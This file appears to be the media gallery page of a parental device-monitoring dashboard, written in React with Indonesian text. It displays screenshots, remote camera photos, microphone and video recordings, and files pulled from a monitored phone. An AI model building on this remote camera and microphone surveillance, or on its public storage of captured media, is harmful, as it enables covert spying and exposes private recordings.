'use client';

import React, { useEffect, useState, useCallback } from 'react';
import {
  Image as ImageIcon, RefreshCw, Loader2, AlertTriangle, FolderOpen,
  Search, X, Trash2, Aperture, Monitor, ZoomIn, Download,
  ChevronLeft, ChevronRight, FileImage, Mic, Video, HardDrive,
} from 'lucide-react';
import { supabase } from '../../../lib/supabase';

// ─── Types ───────────────────────────────────────────────────────────────────

type MediaType   = 'screenshot' | 'camera' | 'gallery' | 'microphone' | 'video' | 'file-transfer';
type MediaKind   = 'image' | 'audio' | 'video';
type TabFilter   = 'all' | MediaType;

interface UnifiedItem {
  uid:         string;
  type:        MediaType;
  mediaKind:   MediaKind;
  name:        string;
  takenAt:     string;
  fileSize?:   number;
  storagePath?: string;
  bucket?:     string;
  devicePath?: string;
  albumName?:  string;
  label?:      string;
  duration?:   number;   // seconds — for audio/video
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

function formatBytes(b?: number): string {
  if (!b || b === 0) return '—';
  if (b < 1024) return `${b} B`;
  if (b < 1024 * 1024) return `${(b / 1024).toFixed(1)} KB`;
  return `${(b / 1024 / 1024).toFixed(1)} MB`;
}

function formatDuration(s?: number): string {
  if (!s) return '';
  if (s < 60) return `${s}d`;
  return `${Math.floor(s / 60)}m ${s % 60 > 0 ? `${s % 60}d` : ''}`.trim();
}

function timeAgo(iso: string): string {
  const d = (Date.now() - new Date(iso).getTime()) / 60000;
  if (d < 1) return 'Baru saja';
  if (d < 60) return `${Math.floor(d)} mnt lalu`;
  const h = Math.floor(d / 60);
  if (h < 24) return `${h} jam lalu`;
  return `${Math.floor(h / 24)} hari lalu`;
}

function fullDate(iso: string): string {
  return new Date(iso).toLocaleString('id-ID', {
    day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit',
  });
}

const TYPE_META: Record<MediaType, { label: string; color: string; bg: string; border: string; Icon: React.ElementType }> = {
  screenshot:    { label: 'Screenshot',    color: 'text-accentBlue',   bg: 'bg-accentBlue/10',   border: 'border-accentBlue/30',   Icon: Monitor    },
  camera:        { label: 'Foto Kamera',   color: 'text-accentViolet', bg: 'bg-accentViolet/10', border: 'border-accentViolet/30', Icon: Aperture   },
  gallery:       { label: 'Galeri HP',     color: 'text-accentYellow', bg: 'bg-accentYellow/10', border: 'border-yellow-900/30',   Icon: FolderOpen },
  microphone:    { label: 'Mikrofon',      color: 'text-accentGreen',  bg: 'bg-accentGreen/10',  border: 'border-accentGreen/30',  Icon: Mic        },
  video:         { label: 'Rekam Video',   color: 'text-accentRed',    bg: 'bg-red-500/10',      border: 'border-red-500/30',      Icon: Video      },
  'file-transfer': { label: 'File Unduhan', color: 'text-cyan-400',   bg: 'bg-cyan-500/10',     border: 'border-cyan-500/30',     Icon: HardDrive  },
};

// ─── Component ───────────────────────────────────────────────────────────────

export default function GalleryPage() {
  const [loading, setLoading]       = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [device, setDevice]         = useState<any>(null);
  const [items, setItems]           = useState<UnifiedItem[]>([]);
  const [error, setError]           = useState<string | null>(null);

  const [tabFilter, setTabFilter]   = useState<TabFilter>('all');
  const [search, setSearch]         = useState('');
  const [dateFilter, setDateFilter] = useState<'7d' | '30d' | 'all'>('30d');

  const [selected, setSelected]     = useState<UnifiedItem | null>(null);
  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
  const [lightbox, setLightbox]     = useState(false);

  const [deletingIds, setDeletingIds] = useState<Set<string>>(new Set());
  const [clearingAll, setClearingAll]   = useState(false);
  const [confirmClear, setConfirmClear] = useState(false);

  // ─── Fetch ─────────────────────────────────────────────────────────────────

  const sinceIso = () => {
    if (dateFilter === 'all') return null;
    const days = dateFilter === '7d' ? 7 : 30;
    return new Date(Date.now() - days * 86400000).toISOString();
  };

  const fetchData = useCallback(async (dev?: any, silent = false) => {
    const target = dev || device;
    if (!target) return;
    if (!silent) setRefreshing(true);
    const since = sinceIso();

    try {
      let ssQ  = supabase.from('screenshots').select('id,storage_path,trigger_reason,file_size_bytes,captured_at').eq('device_id', target.id).order('captured_at', { ascending: false }).limit(300);
      let camQ = supabase.from('camera_commands').select('id,storage_path,camera_side,file_size_bytes,executed_at,created_at').eq('device_id', target.id).eq('status', 'EXECUTED').order('executed_at', { ascending: false }).limit(300);
      let galQ = supabase.from('gallery_items').select('id,file_name,file_path,file_size_bytes,mime_type,album_name,taken_at').eq('device_id', target.id).order('taken_at', { ascending: false }).limit(500);
      let micQ = supabase.from('microphone_commands').select('id,storage_path,duration_seconds,file_size_bytes,executed_at,created_at').eq('device_id', target.id).eq('status', 'EXECUTED').order('executed_at', { ascending: false }).limit(200);
      let vidQ = supabase.from('video_commands').select('id,storage_path,camera_side,duration_seconds,file_size_bytes,executed_at,created_at').eq('device_id', target.id).eq('status', 'EXECUTED').order('executed_at', { ascending: false }).limit(200);
      // File transfer — hanya yang berhasil & berupa gambar/video (tampilkan di galeri)
      let ftQ  = supabase.from('file_transfer_commands').select('id,file_name,file_path,mime_type,storage_path,file_size_bytes,executed_at,created_at').eq('device_id', target.id).eq('status', 'DONE').not('storage_path', 'is', null).or('mime_type.ilike.image/%,mime_type.ilike.video/%').order('executed_at', { ascending: false }).limit(200);

      if (since) {
        ssQ  = ssQ.gte('captured_at', since);
        camQ = camQ.gte('created_at', since);
        galQ = galQ.gte('taken_at', since);
        micQ = micQ.gte('created_at', since);
        vidQ = vidQ.gte('created_at', since);
        ftQ  = ftQ.gte('created_at', since);
      }

      const [ssRes, camRes, galRes, micRes, vidRes, ftRes] = await Promise.all([ssQ, camQ, galQ, micQ, vidQ, ftQ]);

      const unified: UnifiedItem[] = [];

      (ssRes.data || []).forEach((s: any) => unified.push({
        uid: `screenshot-${s.id}`, type: 'screenshot', mediaKind: 'image',
        name: s.storage_path?.split('/').pop() ?? `screenshot_${s.id}`,
        takenAt: s.captured_at, fileSize: s.file_size_bytes,
        storagePath: s.storage_path, bucket: 'screenshots',
        label: s.trigger_reason ?? 'Screenshot',
      }));

      (camRes.data || []).forEach((c: any) => unified.push({
        uid: `camera-${c.id}`, type: 'camera', mediaKind: 'image',
        name: c.storage_path?.split('/').pop() ?? `camera_${c.id}`,
        takenAt: c.executed_at ?? c.created_at, fileSize: c.file_size_bytes,
        storagePath: c.storage_path, bucket: 'camera-photos',
        label: c.camera_side === 'FRONT' ? 'Depan' : 'Belakang',
      }));

      (galRes.data || []).forEach((g: any) => unified.push({
        uid: `gallery-${g.id}`, type: 'gallery', mediaKind: 'image',
        name: g.file_name, takenAt: g.taken_at, fileSize: g.file_size_bytes,
        devicePath: g.file_path, albumName: g.album_name, label: g.album_name,
      }));

      (micRes.data || []).forEach((m: any) => unified.push({
        uid: `microphone-${m.id}`, type: 'microphone', mediaKind: 'audio',
        name: m.storage_path?.split('/').pop() ?? `mic_${m.id}.m4a`,
        takenAt: m.executed_at ?? m.created_at, fileSize: m.file_size_bytes,
        storagePath: m.storage_path, bucket: 'audio-recordings',
        duration: m.duration_seconds,
        label: m.duration_seconds ? formatDuration(m.duration_seconds) : undefined,
      }));

      (vidRes.data || []).forEach((v: any) => unified.push({
        uid: `video-${v.id}`, type: 'video', mediaKind: 'video',
        name: v.storage_path?.split('/').pop() ?? `vid_${v.id}.mp4`,
        takenAt: v.executed_at ?? v.created_at, fileSize: v.file_size_bytes,
        storagePath: v.storage_path, bucket: 'video-recordings',
        duration: v.duration_seconds,
        label: `${v.camera_side === 'FRONT' ? 'Depan' : 'Belakang'}${v.duration_seconds ? ` · ${formatDuration(v.duration_seconds)}` : ''}`,
      }));

      (ftRes.data || []).forEach((f: any) => {
        const mime: string = f.mime_type ?? '';
        const kind: MediaKind = mime.startsWith('video/') ? 'video' : 'image';
        unified.push({
          uid: `file-transfer-${f.id}`, type: 'file-transfer', mediaKind: kind,
          name: f.file_name ?? f.storage_path?.split('/').pop() ?? `file_${f.id}`,
          takenAt: f.executed_at ?? f.created_at, fileSize: f.file_size_bytes,
          storagePath: f.storage_path, bucket: 'file-transfers',
          devicePath: f.file_path,
          label: f.file_path?.split('/').slice(-3).join('/') ?? '',
        });
      });

      unified.sort((a, b) => new Date(b.takenAt).getTime() - new Date(a.takenAt).getTime());
      setItems(unified);
      setError(null);
    } catch (err: any) {
      setError(err?.message ?? 'Gagal memuat galeri');
    } finally {
      setRefreshing(false);
    }
  }, [device, dateFilter]);

  useEffect(() => {
    const init = async () => {
      setLoading(true);
      try {
        const { data } = await supabase.from('devices').select('*').order('created_at', { ascending: false });
        if (!data?.length) return;
        const saved = typeof window !== 'undefined' ? localStorage.getItem('selected_device_id') : null;
        const dev = data.find((d: any) => d.id === saved) || data[0];
        setDevice(dev);
        await fetchData(dev, true);
      } finally { setLoading(false); }
    };
    init();
  }, []);

  useEffect(() => { if (device) fetchData(device, true); }, [dateFilter]);

  // ─── Preview ───────────────────────────────────────────────────────────────

  const loadPreview = useCallback(async (item: UnifiedItem) => {
    if (!item.storagePath || !item.bucket) { setPreviewUrl(null); return; }
    // Bucket file-transfers bersifat private → pakai signed URL
    if (item.bucket === 'file-transfers') {
      const { data } = await supabase.storage.from('file-transfers').createSignedUrl(item.storagePath, 3600);
      setPreviewUrl(data?.signedUrl ?? null);
      return;
    }
    // Bucket lain publik — gunakan public URL langsung (synchronous)
    const { data } = supabase.storage.from(item.bucket).getPublicUrl(item.storagePath);
    setPreviewUrl(data.publicUrl);
  }, []);

  const handleSelect = useCallback((item: UnifiedItem) => {
    if (selected?.uid === item.uid) { setSelected(null); setPreviewUrl(null); return; }
    setSelected(item);
    loadPreview(item);
  }, [selected, loadPreview]);

  const filtered = items.filter(item => {
    if (tabFilter !== 'all' && item.type !== tabFilter) return false;
    if (search && !item.name.toLowerCase().includes(search.toLowerCase()) &&
        !(item.albumName?.toLowerCase().includes(search.toLowerCase()))) return false;
    return true;
  });

  const selectedIdx = selected ? filtered.findIndex(i => i.uid === selected.uid) : -1;

  const navigatePreview = (dir: 1 | -1) => {
    if (!selected) return;
    const next = filtered[selectedIdx + dir];
    if (next) handleSelect(next);
  };

  // ─── Delete ────────────────────────────────────────────────────────────────

  const handleDelete = async (item: UnifiedItem) => {
    setDeletingIds(prev => new Set(prev).add(item.uid));
    if (selected?.uid === item.uid) { setSelected(null); setPreviewUrl(null); }
    setItems(prev => prev.filter(i => i.uid !== item.uid));

    const id = parseInt(item.uid.split('-').slice(1).join('-'));
    if (item.type === 'screenshot') {
      await supabase.from('screenshots').delete().eq('id', id);
      if (item.storagePath) await supabase.storage.from('screenshots').remove([item.storagePath]);
    } else if (item.type === 'camera') {
      await supabase.from('camera_commands').delete().eq('id', id);
      if (item.storagePath) await supabase.storage.from('camera-photos').remove([item.storagePath]);
    } else if (item.type === 'microphone') {
      await supabase.from('microphone_commands').delete().eq('id', id);
      if (item.storagePath) await supabase.storage.from('audio-recordings').remove([item.storagePath]);
    } else if (item.type === 'video') {
      await supabase.from('video_commands').delete().eq('id', id);
      if (item.storagePath) await supabase.storage.from('video-recordings').remove([item.storagePath]);
    } else if (item.type === 'file-transfer') {
      await supabase.from('file_transfer_commands').delete().eq('id', id);
      if (item.storagePath) await supabase.storage.from('file-transfers').remove([item.storagePath]);
    } else {
      await supabase.from('gallery_items').delete().eq('id', id);
    }
    setDeletingIds(prev => { const n = new Set(prev); n.delete(item.uid); return n; });
  };

  // ─── Clear All ─────────────────────────────────────────────────────────────

  const handleClearAll = async () => {
    if (!device) return;
    if (!confirmClear) { setConfirmClear(true); return; }
    setClearingAll(true); setConfirmClear(false);
    try {
      const remove = async (table: string, bucket: string) => {
        const { data: rows } = await supabase.from(table).select('storage_path').eq('device_id', device.id);
        if (rows?.length) {
          const paths = rows.map((r: any) => r.storage_path).filter(Boolean);
          for (let i = 0; i < paths.length; i += 100)
            await supabase.storage.from(bucket).remove(paths.slice(i, i + 100));
        }
        await supabase.from(table).delete().eq('device_id', device.id);
      };
      await Promise.all([
        remove('screenshots', 'screenshots'),
        remove('camera_commands', 'camera-photos'),
        remove('microphone_commands', 'audio-recordings'),
        remove('video_commands', 'video-recordings'),
        remove('file_transfer_commands', 'file-transfers'),
        supabase.from('gallery_items').delete().eq('device_id', device.id),
      ]);
      await fetchData();
    } catch (err: any) {
      console.error('Clear all failed', err);
    } finally { setClearingAll(false); }
  };

  // ─── Stats ─────────────────────────────────────────────────────────────────

  const counts = {
    all:           items.length,
    screenshot:    items.filter(i => i.type === 'screenshot').length,
    camera:        items.filter(i => i.type === 'camera').length,
    gallery:       items.filter(i => i.type === 'gallery').length,
    microphone:    items.filter(i => i.type === 'microphone').length,
    video:         items.filter(i => i.type === 'video').length,
    'file-transfer': items.filter(i => i.type === 'file-transfer').length,
  };
  const totalSize = items.reduce((s, i) => s + (i.fileSize ?? 0), 0);

  // ─── Loading ───────────────────────────────────────────────────────────────

  if (loading) return (
    <div className="flex items-center justify-center min-h-[60vh] gap-3 text-textSecondary">
      <Loader2 className="animate-spin text-accentViolet" size={36} />
      <p className="text-sm">Memuat galeri...</p>
    </div>
  );

  // ─── Render ────────────────────────────────────────────────────────────────

  return (
    <div className="space-y-5">

      {/* ── Header ── */}
      <div className="flex items-center justify-between flex-wrap gap-3">
        <div>
          <h1 className="text-3xl font-bold tracking-tight">Galeri Media</h1>
          <p className="text-textSecondary mt-1 text-sm">
            {counts.screenshot} screenshot · {counts.camera} foto kamera · {counts.gallery} galeri · {counts.microphone} audio · {counts.video} video · {counts['file-transfer']} file unduhan · {formatBytes(totalSize)}
          </p>
        </div>
        <div className="flex items-center gap-2 flex-wrap">
          {(['7d','30d','all'] as const).map(f => (
            <button key={f} onClick={() => setDateFilter(f)}
              className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-colors ${dateFilter === f ? 'bg-accentViolet text-white' : 'glass-card text-textSecondary hover:text-textPrimary'}`}>
              {f === '7d' ? '7 Hari' : f === '30d' ? '30 Hari' : 'Semua'}
            </button>
          ))}
          <button onClick={() => fetchData()} className="p-2.5 glass-card rounded-xl text-textSecondary hover:text-textPrimary" title="Refresh">
            <RefreshCw size={16} className={refreshing ? 'animate-spin' : ''} />
          </button>
          <button
            onClick={handleClearAll}
            disabled={clearingAll || !device}
            onMouseLeave={() => setConfirmClear(false)}
            className={`flex items-center gap-1.5 px-3 py-2 rounded-xl text-xs font-semibold transition-all disabled:opacity-40 ${
              confirmClear ? 'bg-red-600 text-white animate-pulse' : 'glass-card text-accentRed/70 hover:bg-red-950/30 hover:text-accentRed border border-red-900/20'
            }`}
          >
            {clearingAll ? <Loader2 size={13} className="animate-spin" /> : <Trash2 size={13} />}
            {clearingAll ? 'Menghapus...' : confirmClear ? 'Konfirmasi hapus semua?' : 'Hapus Semua'}
          </button>
        </div>
      </div>

      {error && (
        <div className="flex gap-3 p-4 bg-red-950/30 border border-red-900/40 rounded-xl">
          <AlertTriangle size={16} className="text-red-400 shrink-0 mt-0.5" />
          <p className="text-red-300 text-xs font-mono">{error}</p>
        </div>
      )}

      {/* ── Tab filter ── */}
      <div className="flex gap-2 flex-wrap">
        {([
          { key: 'all',        label: `Semua (${counts.all})`,               Icon: ImageIcon  },
          { key: 'screenshot', label: `Screenshot (${counts.screenshot})`,   Icon: Monitor    },
          { key: 'camera',     label: `Foto (${counts.camera})`,             Icon: Aperture   },
          { key: 'gallery',    label: `Galeri (${counts.gallery})`,          Icon: FolderOpen },
          { key: 'microphone',    label: `Audio (${counts.microphone})`,               Icon: Mic        },
          { key: 'video',         label: `Video (${counts.video})`,                  Icon: Video      },
          { key: 'file-transfer', label: `File Unduhan (${counts['file-transfer']})`, Icon: HardDrive  },
        ] as const).map(t => (
          <button key={t.key} onClick={() => setTabFilter(t.key as TabFilter)}
            className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold transition-all ${
              tabFilter === t.key
                ? 'bg-accentViolet/15 text-violetLight border border-accentViolet/40'
                : 'glass-card text-textSecondary hover:text-textPrimary border border-transparent'
            }`}>
            <t.Icon size={12} />
            {t.label}
          </button>
        ))}
        <div className="flex-1 min-w-[180px] relative">
          <Search size={13} className="absolute left-3 top-1/2 -translate-y-1/2 text-textSecondary" />
          <input type="text" placeholder="Cari nama file..." value={search}
            onChange={e => setSearch(e.target.value)}
            className="w-full pl-8 pr-8 py-1.5 text-xs bg-darkBg border border-borderDark rounded-lg text-textPrimary placeholder-textSecondary/50 focus:outline-none focus:border-accentViolet focus:ring-1 focus:ring-accentViolet/30"
          />
          {search && (
            <button onClick={() => setSearch('')} className="absolute right-2 top-1/2 -translate-y-1/2 text-textSecondary hover:text-textPrimary">
              <X size={11} />
            </button>
          )}
        </div>
      </div>

      {/* ── Main layout ── */}
      {filtered.length === 0 ? (
        <div className="glass-card rounded-2xl p-16 text-center">
          <FileImage size={48} className="text-textSecondary/20 mx-auto mb-4" />
          <p className="text-sm text-textSecondary">
            {items.length === 0 ? 'Belum ada media dari perangkat.' : 'Tidak ada item yang cocok.'}
          </p>
        </div>
      ) : (
        <div className={`flex gap-5 items-start ${selected ? 'flex-col lg:flex-row' : ''}`}>

          {/* ── List panel ── */}
          <div className={`${selected ? 'lg:w-2/5 w-full' : 'w-full'} glass-card rounded-2xl overflow-hidden`}>
            <div className="overflow-y-auto max-h-[72vh]">
              <table className="w-full text-xs">
                <thead className="sticky top-0 z-10 bg-cardBg/95 backdrop-blur">
                  <tr className="border-b border-borderDark/50">
                    <th className="text-left px-4 py-3 text-textSecondary font-semibold">Nama</th>
                    <th className="text-left px-4 py-3 text-textSecondary font-semibold hidden sm:table-cell">Tipe</th>
                    <th className="text-right px-4 py-3 text-textSecondary font-semibold hidden md:table-cell">Ukuran</th>
                    <th className="text-right px-4 py-3 text-textSecondary font-semibold">Waktu</th>
                    <th className="px-3 py-3"></th>
                  </tr>
                </thead>
                <tbody>
                  {filtered.map((item, i) => {
                    const meta     = TYPE_META[item.type];
                    const TypeIcon = meta.Icon;
                    const isSelected = selected?.uid === item.uid;
                    const canPreview = !!item.storagePath;
                    return (
                      <tr
                        key={item.uid}
                        onClick={() => handleSelect(item)}
                        className={`border-b border-borderDark/20 cursor-pointer transition-colors ${
                          isSelected
                            ? 'bg-accentViolet/10 border-l-2 border-l-accentViolet'
                            : `hover:bg-accentViolet/5 ${i % 2 === 0 ? '' : 'bg-cardBg/30'}`
                        }`}
                      >
                        <td className="px-4 py-2.5">
                          <div className="flex items-center gap-2 min-w-0">
                            <span className={`w-6 h-6 rounded flex items-center justify-center shrink-0 ${meta.bg} ${meta.color}`}>
                              <TypeIcon size={12} />
                            </span>
                            <span className={`font-mono truncate ${selected ? 'max-w-[120px]' : 'max-w-[240px]'} ${isSelected ? 'text-violetLight' : 'text-textPrimary'}`}
                              title={item.name}>
                              {item.name}
                            </span>
                            {canPreview && item.mediaKind === 'image' && <ZoomIn size={10} className="text-textSecondary/40 shrink-0" />}
                          </div>
                          {item.label && (
                            <span className={`ml-8 text-[10px] ${meta.color} opacity-70`}>{item.label}</span>
                          )}
                        </td>
                        <td className="px-4 py-2.5 hidden sm:table-cell">
                          <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${meta.bg} ${meta.color} border ${meta.border}`}>
                            {meta.label}
                          </span>
                        </td>
                        <td className="px-4 py-2.5 text-right text-textSecondary tabular-nums hidden md:table-cell">
                          {formatBytes(item.fileSize)}
                        </td>
                        <td className="px-4 py-2.5 text-right text-textSecondary/70 whitespace-nowrap">
                          {timeAgo(item.takenAt)}
                        </td>
                        <td className="px-3 py-2.5">
                          <button
                            onClick={(e) => { e.stopPropagation(); handleDelete(item); }}
                            disabled={deletingIds.has(item.uid)}
                            className="p-1.5 rounded-lg text-textSecondary/30 hover:text-red-400 hover:bg-red-500/10 transition-all disabled:opacity-30"
                            title="Hapus"
                          >
                            {deletingIds.has(item.uid)
                              ? <Loader2 size={12} className="animate-spin" />
                              : <Trash2 size={12} />}
                          </button>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </div>

          {/* ── Preview panel ── */}
          {selected && (
            <div className="lg:flex-1 w-full glass-card rounded-2xl overflow-hidden sticky top-5">
              {/* Header */}
              <div className="flex items-center justify-between px-5 py-3 border-b border-borderDark/50">
                <div className="flex items-center gap-2 min-w-0">
                  {(() => { const m = TYPE_META[selected.type]; const I = m.Icon; return <I size={14} className={m.color} />; })()}
                  <span className="text-xs font-semibold text-textPrimary truncate max-w-[200px]">{selected.name}</span>
                </div>
                <div className="flex items-center gap-1">
                  <button onClick={() => navigatePreview(-1)} disabled={selectedIdx === 0}
                    className="p-1.5 rounded-lg text-textSecondary hover:text-textPrimary disabled:opacity-20 transition-colors">
                    <ChevronLeft size={14} />
                  </button>
                  <span className="text-[10px] text-textSecondary tabular-nums px-1">{selectedIdx + 1}/{filtered.length}</span>
                  <button onClick={() => navigatePreview(1)} disabled={selectedIdx === filtered.length - 1}
                    className="p-1.5 rounded-lg text-textSecondary hover:text-textPrimary disabled:opacity-20 transition-colors">
                    <ChevronRight size={14} />
                  </button>
                  <button onClick={() => { setSelected(null); setPreviewUrl(null); }}
                    className="p-1.5 rounded-lg text-textSecondary hover:text-textPrimary transition-colors ml-1">
                    <X size={14} />
                  </button>
                </div>
              </div>

              {/* Media area */}
              <div className="bg-black/30 min-h-[200px] flex items-center justify-center relative p-3">
                {!selected.storagePath ? (
                  /* Gallery metadata — no actual file */
                  <div className="text-center text-textSecondary py-10 px-6">
                    <FolderOpen size={36} className="mx-auto mb-3 text-accentYellow/40" />
                    <p className="text-sm font-semibold text-textPrimary">{selected.albumName}</p>
                    <p className="text-xs mt-1 text-textSecondary/70">Foto tersimpan di perangkat anak</p>
                    <p className="text-[10px] mt-3 font-mono text-textSecondary/50 break-all px-2">{selected.devicePath}</p>
                  </div>
                ) : selected.mediaKind === 'audio' ? (
                  /* Audio player */
                  <div className="w-full flex flex-col items-center gap-4 py-6">
                    <div className={`w-16 h-16 rounded-full flex items-center justify-center ${TYPE_META.microphone.bg}`}>
                      <Mic size={28} className={TYPE_META.microphone.color} />
                    </div>
                    {previewUrl && (
                      <audio
                        key={previewUrl}
                        src={previewUrl}
                        controls
                        autoPlay
                        className="w-full max-w-sm"
                        style={{ colorScheme: 'dark' }}
                      />
                    )}
                  </div>
                ) : selected.mediaKind === 'video' ? (
                  /* Video player */
                  <div className="w-full">
                    {previewUrl && (
                      <video
                        key={previewUrl}
                        src={previewUrl}
                        controls
                        autoPlay
                        className="w-full max-h-64 object-contain rounded-lg"
                        onEnded={() => {}}
                      />
                    )}
                  </div>
                ) : previewUrl ? (
                  /* Image */
                  <>
                    {/* eslint-disable-next-line @next/next/no-img-element */}
                    <img
                      src={previewUrl}
                      alt={selected.name}
                      className="max-h-[50vh] max-w-full object-contain cursor-zoom-in rounded"
                      onClick={() => setLightbox(true)}
                    />
                    <div className="absolute top-2 right-2 flex gap-1.5">
                      <button onClick={() => setLightbox(true)}
                        className="p-1.5 bg-black/50 rounded-lg text-white/80 hover:text-white transition-colors">
                        <ZoomIn size={14} />
                      </button>
                      <a href={previewUrl} download={selected.name} target="_blank" rel="noreferrer"
                        className="p-1.5 bg-black/50 rounded-lg text-white/80 hover:text-white transition-colors">
                        <Download size={14} />
                      </a>
                    </div>
                  </>
                ) : null}
              </div>

              {/* Metadata */}
              <div className="px-5 py-4 space-y-2">
                {[
                  { label: 'Tipe',    value: TYPE_META[selected.type].label },
                  { label: 'Waktu',   value: fullDate(selected.takenAt)     },
                  { label: 'Ukuran',  value: formatBytes(selected.fileSize)  },
                  ...(selected.duration ? [{ label: 'Durasi', value: formatDuration(selected.duration) }] : []),
                  ...(selected.label ? [{
                    label: selected.type === 'camera' ? 'Kamera'
                         : selected.type === 'video'  ? 'Kamera · Durasi'
                         : selected.type === 'screenshot' ? 'Pemicu'
                         : 'Album',
                    value: selected.label,
                  }] : []),
                  ...(selected.devicePath ? [{ label: 'Path', value: selected.devicePath }] : []),
                ].map((r, i) => (
                  <div key={i} className="flex items-start justify-between gap-3 text-xs py-1.5 border-b border-borderDark/30 last:border-0">
                    <span className="text-textSecondary shrink-0 font-medium">{r.label}</span>
                    <span className="text-textPrimary text-right font-mono break-all">{r.value}</span>
                  </div>
                ))}
                {/* Download button for audio/video */}
                {selected.storagePath && previewUrl && (selected.mediaKind === 'audio' || selected.mediaKind === 'video') && (
                  <a href={previewUrl} download={selected.name} target="_blank" rel="noreferrer"
                    className="mt-2 flex items-center justify-center gap-2 w-full py-2 rounded-lg bg-accentViolet/10 text-violetLight text-xs font-semibold hover:bg-accentViolet/20 transition-colors border border-accentViolet/30">
                    <Download size={13} />
                    Unduh {selected.mediaKind === 'audio' ? 'Audio' : 'Video'}
                  </a>
                )}
              </div>
            </div>
          )}
        </div>
      )}

      {/* ── Lightbox (hanya untuk gambar) ── */}
      {lightbox && previewUrl && selected?.mediaKind === 'image' && (
        <div className="fixed inset-0 z-50 bg-black/95 flex items-center justify-center" onClick={() => setLightbox(false)}>
          <button onClick={(e) => { e.stopPropagation(); navigatePreview(-1); }} disabled={selectedIdx === 0}
            className="absolute left-4 top-1/2 -translate-y-1/2 p-2 rounded-xl bg-white/10 text-white hover:bg-white/20 disabled:opacity-20 transition-colors z-10">
            <ChevronLeft size={24} />
          </button>
          <button onClick={(e) => { e.stopPropagation(); navigatePreview(1); }} disabled={selectedIdx === filtered.length - 1}
            className="absolute right-4 top-1/2 -translate-y-1/2 p-2 rounded-xl bg-white/10 text-white hover:bg-white/20 disabled:opacity-20 transition-colors z-10">
            <ChevronRight size={24} />
          </button>
          <div className="absolute top-4 right-4 flex gap-2 z-10">
            <a href={previewUrl} download={selected?.name} target="_blank" rel="noreferrer"
              onClick={e => e.stopPropagation()}
              className="p-2 rounded-xl bg-white/10 text-white hover:bg-white/20 transition-colors">
              <Download size={18} />
            </a>
            <button onClick={() => setLightbox(false)} className="p-2 rounded-xl bg-white/10 text-white hover:bg-white/20 transition-colors">
              <X size={18} />
            </button>
          </div>
          <div className="absolute bottom-4 left-1/2 -translate-x-1/2 text-center z-10">
            <p className="text-white/70 text-xs font-mono">{selected?.name}</p>
            <p className="text-white/40 text-[10px] mt-0.5">{selectedIdx + 1} / {filtered.length}</p>
          </div>
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img src={previewUrl} alt={selected?.name || 'preview'}
            className="max-h-[90vh] max-w-[90vw] object-contain rounded-lg shadow-2xl"
            onClick={e => e.stopPropagation()} />
        </div>
      )}
    </div>
  );
}
